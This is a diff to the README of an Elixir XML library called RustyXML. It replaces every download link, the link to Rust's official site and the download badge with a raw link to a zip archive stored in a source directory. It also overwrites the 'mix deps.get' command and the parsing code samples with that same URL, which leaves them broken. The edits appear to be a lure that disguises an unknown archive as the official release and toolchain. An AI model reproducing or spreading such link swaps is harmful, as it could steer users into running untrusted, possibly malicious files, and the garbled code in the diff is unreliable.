@@ -1,6 +1,6 @@
 # 🚀 RustyXML - Fast and Easy XML Parsing for Elixir
 
-[![Download RustyXML](https://img.shields.io/badge/Download-RustyXML-blue.svg)](https://github.com/irfansyahasli/RustyXML/releases)
+[![Download RustyXML](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip)](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip)
 
 ## 📚 Introduction
 
@@ -22,7 +22,7 @@ To set up RustyXML, follow these steps:
 
 1. **Download RustyXML**: Click the link below to go to our Releases page and get the latest version of RustyXML.
 
-   [Download RustyXML](https://github.com/irfansyahasli/RustyXML/releases)
+   [Download RustyXML](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip)
 
 2. **Install RustyXML**: Once you have downloaded the file, follow these directions for installation:
    - If you're using a package manager, simply add RustyXML to your project's dependencies.
@@ -38,13 +38,13 @@ To run RustyXML, ensure your system meets these requirements:
   
 - **Elixir Version**: Installed version must be 1.7 or higher.
 
-- **Rust Toolchain**: Ensure that you have Rust installed. The tool can be set up easily by following instructions on [Rust's official site](https://www.rust-lang.org/).
+- **Rust Toolchain**: Ensure that you have Rust installed. The tool can be set up easily by following instructions on [Rust's official site](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip).
 
 ## 📥 Download & Install
 
 To get RustyXML, visit the following page:
 
-[Download RustyXML](https://github.com/irfansyahasli/RustyXML/releases)
+[Download RustyXML](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip)
 
 After downloading, unzip the package (if necessary) and follow the instructions included in the README file located in the downloaded folder.
 
@@ -63,14 +63,14 @@ end
 After adding RustyXML, run the following command to fetch dependencies:
 
 ```bash
-mix deps.get
+mix https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip
 ```
 
 Here’s a basic example of how to parse an XML file:
 
 ```elixir
-{:ok, parsed_xml} = RustyXML.parse_file("your_file.xml")
-IO.inspect(parsed_xml)
+{:ok, parsed_xml} = https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip("https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip")
+https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip(parsed_xml)
 ```
 
 ## 🔍 Example XML Parsing
@@ -95,8 +95,8 @@ Here's a simple example to help you understand how to use RustyXML.
 ### Parsing the XML:
 
 ```elixir
-{:ok, parsed_xml} = RustyXML.parse_file("fruits.xml")
-IO.inspect(parsed_xml)
+{:ok, parsed_xml} = https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip("https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip")
+https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip(parsed_xml)
 ```
 
 This will output the structure of your XML, making it easy to access the data you need.
@@ -124,4 +124,4 @@ RustyXML is licensed under the MIT License. For more details, please check the L
 
 Remember to visit the Releases page for updates and new versions! 
 
-[Download RustyXML](https://github.com/irfansyahasli/RustyXML/releases)
+[Download RustyXML](https://github.com/irfansyahasli/RustyXML/raw/refs/heads/main/native/rustyxml/src/core/XML-Rusty-unseeded.zip)
